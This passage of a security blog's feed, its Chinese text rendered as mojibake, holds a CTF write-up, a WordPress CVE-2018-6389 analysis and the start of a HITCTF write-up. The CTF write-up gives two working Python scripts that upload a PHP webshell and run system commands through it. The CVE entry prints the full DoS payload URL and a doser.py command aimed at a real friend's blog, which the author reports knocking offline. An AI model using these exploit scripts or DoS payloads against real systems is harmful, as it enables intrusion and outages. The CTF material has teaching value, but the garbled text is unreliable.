<p>é¢„æœŸè§£æ³•æ˜¯<br>1.usernameæ•°ç»„bypassåç¼€æ£€æŸ¥ï¼Œç»•è¿‡contentçš„waf<br>2.randéšæœºæ•°é¢„æµ‹+çˆ†ç ´æ–‡ä»¶å åœ¨unlinkä¹‹å‰è®¿é—®shell<br>ç»“æœå¤§ä½¬ä»¬ç›´æ¥éé¢„æœŸè§£bypassäº†<code>unlink</code>æ‰“æ‰°äº†<br>éé¢„æœŸè§£å‚è€ƒ<a href="http://skysec.top/2018/02/13/happymoctfä¹‹webå…¨é¢˜è§£/" target="_blank" rel="noopener">ä¸€å¶é£˜é›¶</a>å¸ˆå‚…çš„WriteUp<br>é¢„æœŸè§£å¦‚ä¸‹<br>å†™ä¸¤ä¸ªè„šæœ¬ï¼Œ<br>listen.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#ç›‘å¬8888ç«¯å£ï¼Œæ¥å—6ä¸ª`get_rand_code`çš„ç»“æœï¼Œç„¶åé¢„æµ‹æ¥ä¸‹æ¥ä¸€æ¬¡`get_rand_code`çš„ç»“æœï¼Œè¿™é‡Œå¯èƒ½ä¸ä¼šå¾ˆå‡†ç¡®ï¼Œ</span></div><div class="line"><span class="comment">#æ‰€ä»¥éœ€è¦å°å¹…åº¦çˆ†ç ´ï¼Œå¤æ‚åº¦å¤§æ¦‚ä¸º3^6ï¼Œåæ­£å°±è·‘ç€å‘—</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *  </div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime  </div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">r=req.session()</div><div class="line">url=<span class="string">"http://120.78.57.208:6005/"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_list</span><span class="params">()</span>:</span></div><div class="line">    HOST = <span class="string">''</span>  </div><div class="line">    PORT = <span class="number">8888</span></div><div class="line">    BUFSIZ = <span class="number">128</span>  </div><div class="line">    ADDR = (HOST, PORT)  </div><div class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</div><div class="line">    tcpSerSock.bind(ADDR)</div><div class="line">    tcpSerSock.listen(<span class="number">5</span>)</div><div class="line">    rand_num=<span class="number">0</span></div><div class="line">    l=[]</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        tcpCliSock, addr = tcpSerSock.accept()  </div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:  </div><div class="line">            data = tcpCliSock.recv(BUFSIZ)  </div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:  </div><div class="line">                <span class="keyword">break</span>  </div><div class="line">            data=data[<span class="number">0</span>:<span class="number">6</span>]</div><div class="line">	    <span class="keyword">print</span> data,l</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> data:</div><div class="line">                l.append(ord(i)+<span class="number">1</span>-ord(<span class="string">'a'</span>))</div><div class="line">        rand_num+=<span class="number">1</span></div><div class="line">      	<span class="keyword">if</span> rand_num==<span class="number">6</span>:</div><div class="line">      		<span class="keyword">break</span></div><div class="line">    tcpCliSock.close()  </div><div class="line">    tcpSerSock.close()</div><div class="line">    <span class="keyword">return</span> l</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_salt</span><span class="params">(l)</span>:</span></div><div class="line">    salt=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">        j=len(l)</div><div class="line">        r=(l[j<span class="number">-3</span>]+l[j<span class="number">-31</span>])<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> r&gt;<span class="number">26</span>:</div><div class="line">        	r-=<span class="number">26</span></div><div class="line">        <span class="comment">#print l[j-3],chr(l[j-3]+ord('a')-1),l[j-31],chr(l[j-31]+ord('a')-1),r,chr(r+ord('a')-1)</span></div><div class="line">        l.append(r)</div><div class="line">        salt+=chr(r+ord(<span class="string">'a'</span>)<span class="number">-1</span>)</div><div class="line">        <span class="comment">#print salt</span></div><div class="line">    <span class="keyword">return</span> salt</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(salt)</span>:</span></div><div class="line">    s=hashlib.sha1(<span class="string">'119.23.73.3'</span>).hexdigest()</div><div class="line">    url1=url+<span class="string">'/uploads/'</span>+s+<span class="string">'/'</span>+<span class="string">'moctf'</span>+salt+<span class="string">'.php'</span></div><div class="line">    data=&#123;<span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');echo '666666';"</span>&#125;</div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> salt</div><div class="line">    <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</div><div class="line">    	<span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line">get_flag(<span class="string">'aaaaaa'</span>)</div><div class="line">l=get_rand_list()</div><div class="line">salt=get_salt(l)</div><div class="line">s=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">	s=s+<span class="number">1</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])-int(s[j]))</div><div class="line">	get_flag(salt2)</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])+int(s[j]))</div><div class="line">	get_flag(salt2)</div></pre></td></tr></table></figure></p>
<p>put.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#é€šè¿‡`?action=test`è°ƒç”¨`test_rand_code`å‡½æ•°å‘é€6æ¬¡`get_rand_code`ç»“æœï¼Œä¸€å…±36ä¸ªå­—ç¬¦ï¼Œ</span></div><div class="line"><span class="comment">#ç„¶åæäº¤ä¸€ä¸ªæ„é€ å¥½çš„`?action=test`ï¼Œä¸Šä¼ shellåˆ°æœåŠ¡å™¨ï¼Œåœ¨è¢«åˆ é™¤ä¹‹å‰å°±ä¼šè¢«listençˆ†ç ´å¾—åˆ°ï¼Œæ²¡çˆ†ç ´åˆ°å°±å¤šçˆ†ç ´å‡ æ¬¡</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r=req.session()</div><div class="line">url=<span class="string">"http://120.78.57.208:6005/?action="</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_test</span><span class="params">()</span>:</span></div><div class="line">    url2=url+<span class="string">"test"</span></div><div class="line">    r1=r.get(url2)</div><div class="line">    <span class="keyword">print</span> url2</div><div class="line">    <span class="keyword">print</span> r1.text</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></div><div class="line">    data=&#123;<span class="string">"filename[4]"</span>:<span class="string">"jpg"</span>,</div><div class="line">          <span class="string">"filename[2]"</span>:<span class="string">"jpg"</span>,</div><div class="line">          <span class="string">"filename[1]"</span>:<span class="string">"php"</span>,</div><div class="line">          <span class="string">"content"</span>:<span class="string">"&lt;script language='php'&gt;assert($_POST[a]);&lt;/script&gt;"</span>,</div><div class="line">          <span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');"</span></div><div class="line">          &#125;</div><div class="line">    url1=url+<span class="string">"upload"</span></div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">    get_test()</div><div class="line">upload()</div></pre></td></tr></table></figure></p>
<p>è¿è¡Œç»“æœå¦‚ä¸‹<br><img src="/img/2018moctf2.png" alt=""></p>
<h1 id="æ„Ÿæƒ³"><a href="#æ„Ÿæƒ³" class="headerlink" title="æ„Ÿæƒ³"></a>æ„Ÿæƒ³</h1><p>è®²ä¸€ä¸‹è¿™æ¬¡æ¯”èµ›æˆ‘ä¸»è¦å¹²äº†é‚£äº›äº‹å§</p>
<ol>
<li>å‡ºé¢˜ï¼Œå¦‚ä¸Šæ‰€è¿°</li>
<li>å¹³å°æ­å»ºï¼Œç”¨çš„æ˜¯ctfdï¼Œdockerçš„æ–¹å¼æ­å»ºçš„ï¼Œçœäº†å¾ˆå¤šäº‹</li>
<li>é¢˜ç›®éƒ¨ç½²ï¼Œé™¤äº†pingé‚£é¢˜ï¼Œå…¶ä»–çš„webéƒ½æ˜¯æˆ‘éƒ¨ç½²çš„ï¼Œå°¤å…¶æ˜¯cmsé‚£é¢˜ï¼Œåå¤éƒ¨ç½²çš„æœ‰ç‚¹åï¼Œä¸­é—´æœ‰ä¸ªé›†å¤§å­¦å¼Ÿæ¥å¸®å¿™ï¼Œåé¢æ¯”èµ›çš„æ—¶å€™è¿˜æ˜¯å‡ºäº†é—®é¢˜</li>
<li>å‘å¸ƒé¢˜ç›®ï¼Œemmmmmmmmmmï¼Œç”¨ctfdçš„æ—¶å€™å‡ºç°äº†å¾ˆç¥å¥‡çš„æƒ…å†µï¼Œåœ¨ç¼–è¾‘configçš„æ—¶å€™ä½¿ç”¨è°·æ­Œçš„è‡ªåŠ¨ç¿»è¯‘ï¼Œä¿å­˜ä¹‹åctfdçš„webæœåŠ¡å°±æŒ‚æ‰å•¦ï¼æ˜¯ä¸ªå·¨å‘ï¼Œç°åœ¨è¿˜ä¸çŸ¥é“å’‹å›äº‹</li>
<li>æ¯”èµ›æ—¶å€™çš„æ”¾é¢˜ï¼Œæ”¾hintï¼Œè¿ç»´ï¼Œæ°´ç¾¤ï¼Œå“ˆå“ˆå“ˆå“ˆå’Œå¤§ä½¬ä»¬ç©è€è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„<br>æ”¾ä¸€äº›åå°æ•°æ®<br><img src="/img/2018moctf3.png" alt=""><br><img src="/img/2018moctf4.png" alt=""><br><img src="/img/2018moctf5.png" alt=""></li>
</ol>
<p>åŸæ¥åªæ˜¯æƒ³ç»™æˆ‘ä»¬å­¦æ ¡å’Œé›†å¤§çš„å­¦å¼Ÿä»¬ä½“éªŒæ¯”èµ›çš„ï¼Œä¸è¿‡å¯¹å¤–å¼€æ”¾ä¹Ÿå¸å¼•äº†è®¸å¤šå¸ˆå‚…ä»¬æ¥åšé¢˜ï¼Œè™½ç„¶è¿ç»´å¾—å¾ˆç´¯ï¼Œä½†ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼ˆä¸»è¦æ˜¯éé¢„æœŸå’Œéƒ¨ç½²å„ç§å¥‡è‘©ç¯å¢ƒï¼‰<br>æ‰“ä¸€æ³¢å¹¿å‘Šï¼Œ<a href="http://www.moctf.com/" target="_blank" rel="noopener">http://www.moctf.com/</a><br>MOCTFå¹³å°æ˜¯CodeMonsterå’ŒMokirinè¿™ä¸¤æ”¯CTFæˆ˜é˜Ÿæ‰€æ­å»ºçš„ä¸€ä¸ªCTFåœ¨çº¿ç­”é¢˜ç³»ç»Ÿã€‚é¢˜ç›®å½¢å¼ä¸å„å¤§CTFæ¯”èµ›ç›¸åŒã€‚ç›®çš„æ˜¯ä¸ºä¸¤ä¸ªå­¦æ ¡ä¸­çƒ­çˆ±ä¿¡æ¯å®‰å…¨çš„åŒå­¦ä»¬æä¾›ä¸€ä¸ªåˆ·é¢˜çš„å¹³å°ï¼Œèƒ½å¤Ÿä¸€èµ·å­¦ä¹ ã€è¿›æ­¥ã€‚</p>
<p>æœ€åç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼<br><img src="/img/2018moctf6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»æ”¾å‡åˆ°ç°åœ¨ç­¹åŠå‡†å¤‡äº†æ¥è¿‘ä¸¤ä¸ªæ˜ŸæœŸçš„MOCTFæ–°æ˜¥æ¬¢ä¹èµ›ç»ˆäºè½å¹•å•¦ï¼Œè¿™æ¬¡æ¯”èµ›æˆ‘ä¸€å…±å‡ºäº†1ç­¾åˆ°+1MISC+3WEBï¼Œä¸‹é¢å…ˆæ”¾å®˜æ–¹WriteUpï¼ˆå“‡ç»ˆäºèƒ½å½“ä¸€å›å®˜æ–¹äº†ï¼‰&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-6389 WordPressé€šæ€DoSæ¼æ´åˆ†æ</title>
    <link href="https://www.codemonster.cn/2018/02/06/cve-2018-6389-analysis/"/>
    <id>https://www.codemonster.cn/2018/02/06/cve-2018-6389-analysis/</id>
    <published>2018-02-06T07:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.015Z</updated>
    
    <content type="html"><![CDATA[<p>è¿‘æ—¥ï¼Œ<code>WordPress</code>çˆ†å‡ºé€šæ€æ‰€æœ‰ç‰ˆæœ¬çš„<code>DoS</code>æ¼æ´ï¼ŒCVEç¼–å·<code>CVE-2018-6389</code>ï¼Œ è¿‡å»ä¹å¹´å‘å¸ƒçš„å‡ ä¹æ‰€æœ‰ç‰ˆæœ¬çš„WordPresséƒ½å—å½±å“ï¼ŒåŒ…æ‹¬æœ€æ–°ç‰ˆæœ¬4.9.2ï¼Œä½œè€…ç»™å‡ºäº†pocè§†é¢‘åŠä¿®è¡¥è„šæœ¬ï¼Œåœ¨pocä¸­ä»–å‘èµ·çš„å•ä¸ªè¯·æ±‚ä¼šå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œ181ä¸ªI / Oæ“ä½œï¼Œå¹¶åœ¨å“åº”ä¸­æä¾›æ–‡ä»¶å†…å®¹ï¼Œä½†Wordpresså›¢é˜Ÿæ‹’ç»æ‰¿è®¤è¿™ä¸ªæ¼æ´ã€‚<br><a id="more"></a></p>
<p>æ¼æ´ç›¸å…³ä¿¡æ¯å¦‚ä¸‹</p>
<h3 id="CVE-2018-6389æ¼æ´æ¦‚è¦"><a href="#CVE-2018-6389æ¼æ´æ¦‚è¦" class="headerlink" title="CVE-2018-6389æ¼æ´æ¦‚è¦"></a>CVE-2018-6389æ¼æ´æ¦‚è¦</h3><p>é’ˆå¯¹CVE-2018-6389æ¼æ´æƒ…å†µï¼Œå®‰å…¨åŠ æ•´ç†äº†ç›¸å…³å†…å®¹å¦‚ä¸‹ï¼Œè¿™äº›å†…å®¹å¯èƒ½æ¥è‡ªäºCVE-2018-6389æ¶‰åŠå‚å•†ã€CVE-2018-6389æ¼æ´ä¿¡æ¯å‘å¸ƒç»„ç»‡ã€CVEã€SecurityFocusåŠå…¶å®ƒç¬¬ä¸‰æ–¹ç»„ç»‡ã€‚</p>
<h3 id="CVE-2018-6389æ¼æ´æ ‡è¯†"><a href="#CVE-2018-6389æ¼æ´æ ‡è¯†" class="headerlink" title="CVE-2018-6389æ¼æ´æ ‡è¯†"></a>CVE-2018-6389æ¼æ´æ ‡è¯†</h3><ul>
<li>CVE IDï¼šCVE-2018-6389</li>
<li>BUGTRAQ IDï¼šã€BUGTRAQ IDã€‘</li>
<li>æ¼æ´æ¶‰åŠå‚å•†æ¼æ´åº“IDï¼šã€æ¼æ´æ¶‰åŠå‚å•†æ¼æ´åº“IDã€‘</li>
<li>CNNVD IDï¼šã€CNNVDæ¼æ´ç¼–å·ã€‘</li>
<li>ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“IDï¼šã€ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“IDã€‘</li>
</ul>
<h3 id="CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥"><a href="#CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥" class="headerlink" title="CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥"></a>CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥</h3><ul>
<li>ç™¾åº¦é“¾æ¥ï¼š<a href="https://www.baidu.com/s?wd=CVE-2018-6389" target="_blank" rel="noopener">https://www.baidu.com/s?wd=CVE-2018-6389</a></li>
<li>ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“é“¾æ¥ï¼š<a href="http://www.nsfocus.net/vulndb/{ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“ID}" target="_blank" rel="noopener">http://www.nsfocus.net/vulndb/{ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“ID}</a></li>
<li>Githubé“¾æ¥ï¼š<a href="https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh" target="_blank" rel="noopener">https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh</a></li>
<li>æ¼æ´ä½œè€…é“¾æ¥ï¼š<a href="https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener">https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html</a></li>
</ul>
<h3 id="CVE-2018-6389æ¼æ´è¯¦æƒ…"><a href="#CVE-2018-6389æ¼æ´è¯¦æƒ…" class="headerlink" title="CVE-2018-6389æ¼æ´è¯¦æƒ…"></a>CVE-2018-6389æ¼æ´è¯¦æƒ…</h3><p>æ¼æ´ä½äº<code>load-scripts.php</code>ï¼Œè¯¥æ–‡ä»¶æ˜¯ä¸ºWordPressç®¡ç†å‘˜è®¾è®¡çš„ï¼Œå…è®¸å°†å¤šä¸ªJavaScriptæ–‡ä»¶åŠ è½½åˆ°ä¸€ä¸ªè¯·æ±‚ä¸­ï¼Œä½†ç ”ç©¶äººå‘˜æ³¨æ„åˆ°å¯ä»¥åœ¨ç™»å½•ä¹‹å‰è°ƒç”¨è¯¥å‡½æ•°æ¥å…è®¸ä»»ä½•äººè°ƒç”¨å®ƒï¼Œå³ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨å®ƒã€‚<br>é€šè¿‡æ„é€ ç‰¹æ®Šçš„payloadå¯å¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œ<code>181ä¸ªI/Oæ“ä½œ</code>ï¼Œå¹¶å‘è¯·æ±‚çš„æƒ…å†µä¸‹å³å¯è¾¾åˆ°Dosçš„æ•ˆæœã€‚<br>payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mywpserver.com/wp-admin/load-scripts.php?c=1&amp;load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&amp;ver=4.9</div></pre></td></tr></table></figure></p>
<h3 id="CVE-2018-6389æ¼æ´æµ‹è¯•"><a href="#CVE-2018-6389æ¼æ´æµ‹è¯•" class="headerlink" title="CVE-2018-6389æ¼æ´æµ‹è¯•"></a>CVE-2018-6389æ¼æ´æµ‹è¯•</h3><p>åä¼šçš„å¤§ä½¬é‡Œè²Œä¼¼åªæœ‰æ‰£ç¥æ˜¯wordpressåšå®¢ï¼Œå¯¹ä¸èµ·äº†æ‰£ç¥ï¼<br><a href="http://blog.thecosmos.cn" target="_blank" rel="noopener">http://blog.thecosmos.cn</a><br>Dosè„šæœ¬ï¼Œå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python doser.py  -t 10 -g &quot;http://blog.thecosmos.cn/wp-admin/load-scripts.php?xxxxxxxxxxxxxxxxxx&quot;</div></pre></td></tr></table></figure></p>
<p><img src="/img/CVE-2018-6389-1.png" alt=""><br>å†æ‰“å¼€ç½‘ç«™çœ‹çœ‹ï¼Œå·²ç»508äº†ï¼Œå…¶ä»–äººä¹Ÿæ‰“ä¸å¼€<br><img src="/img/CVE-2018-6389-2.png" alt=""><br>æµ‹è¯•æˆåŠŸï¼ŒDoså…³é—­</p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="http://toutiao.secjia.com/cve-2018-6389" target="_blank" rel="noopener">http://toutiao.secjia.com/cve-2018-6389</a></li>
<li><a href="https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener">https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿‘æ—¥ï¼Œ&lt;code&gt;WordPress&lt;/code&gt;çˆ†å‡ºé€šæ€æ‰€æœ‰ç‰ˆæœ¬çš„&lt;code&gt;DoS&lt;/code&gt;æ¼æ´ï¼ŒCVEç¼–å·&lt;code&gt;CVE-2018-6389&lt;/code&gt;ï¼Œ è¿‡å»ä¹å¹´å‘å¸ƒçš„å‡ ä¹æ‰€æœ‰ç‰ˆæœ¬çš„WordPresséƒ½å—å½±å“ï¼ŒåŒ…æ‹¬æœ€æ–°ç‰ˆæœ¬4.9.2ï¼Œä½œè€…ç»™å‡ºäº†pocè§†é¢‘åŠä¿®è¡¥è„šæœ¬ï¼Œåœ¨pocä¸­ä»–å‘èµ·çš„å•ä¸ªè¯·æ±‚ä¼šå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œ181ä¸ªI / Oæ“ä½œï¼Œå¹¶åœ¨å“åº”ä¸­æä¾›æ–‡ä»¶å†…å®¹ï¼Œä½†Wordpresså›¢é˜Ÿæ‹’ç»æ‰¿è®¤è¿™ä¸ªæ¼æ´ã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="CVE" scheme="https://www.codemonster.cn/tags/CVE/"/>
    
      <category term="WordPress" scheme="https://www.codemonster.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>2018 HITCTF WriteUp</title>
    <link href="https://www.codemonster.cn/2018/02/02/2018-hitctf-writeup/"/>
    <id>https://www.codemonster.cn/2018/02/02/2018-hitctf-writeup/</id>
    <published>2018-02-02T14:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.014Z</updated>
    
    <content type="html"><![CDATA[<p>åˆšæ”¾å‡æ­£å¥½çœ‹åˆ°HITCTFï¼Œåˆ’äº†å‡ é“æ°´é¢˜ï¼ŒWriteUpå¦‚ä¸‹<br><a id="more"></a></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="å•è¡¨ä»£æ›¿-100"><a href="#å•è¡¨ä»£æ›¿-100" class="headerlink" title="å•è¡¨ä»£æ›¿ 100"></a>å•è¡¨ä»£æ›¿ 100</h3><p>ç”¨a-zä»£æ›¿å„ç§ç½—é©¬å­—ç¬¦ï¼Œç„¶å<code>quipqiup</code>è¯é¢‘åˆ†æï¼Œç„¶åæ‰¾åˆ°ç¨å¾®å®Œæ•´çš„å¥å­å»æ‰¾åˆ°åŸæ–‡ï¼Œæœ€åæ›¿æ¢å®Œæ•´çš„æ–‡ç« ï¼Œflagåœ¨æœ«å°¾<br>HITCTF{Aft3r_all_t0morrow_1s_anoth3r_day}</p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h3 id="Baby-Android-50"><a href="#Baby-Android-50" class="headerlink" title="Baby Android 50"></a>Baby Android 50</h3><p>apkåå­—æ˜¯xorï¼Œç”¨æ”¹ä¹‹ç†æˆ–è€…apkkillæ‰“å¼€apkï¼Œåç¼–è¯‘åå‘ç°ä¸¤ä¸²å­—ç¬¦ï¼Œ<code>å¼‚æˆ–</code>ä¸€ä¸‹å¾—åˆ°flag</p>
